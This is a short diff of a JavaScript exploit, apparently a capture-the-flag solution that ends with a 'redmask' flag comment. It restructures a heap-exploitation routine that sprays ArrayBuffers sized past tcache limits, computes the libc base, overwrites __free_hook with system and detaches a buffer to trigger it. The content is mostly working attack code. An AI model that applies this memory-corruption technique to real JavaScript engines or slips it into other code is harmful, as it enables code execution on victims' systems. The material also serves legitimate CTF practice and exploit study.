@@ -29,8 +29,8 @@ function u64(strIn){
     return BigInt(hex)
 }
 
-// our main
-function pwn() {
+// our main exploit
+(() => {
     // allocate buffer big enough than tcache/fastbin > 0x408
     const buff_spray = new ArrayBuffer(0x418)
     const spray_u64 = new BigUint64Array(buff_spray)
@@ -76,8 +76,6 @@ function pwn() {
     buff2_view[0] = libc_base + system
     print("[+] successfully overwrite __free_hook w system")
     ArrayBufferDetach(buff1)
-}
-poc()
-pwn()
+})();
 
 // redmask{ah_yes_the_classic_how2heap_ye_et}
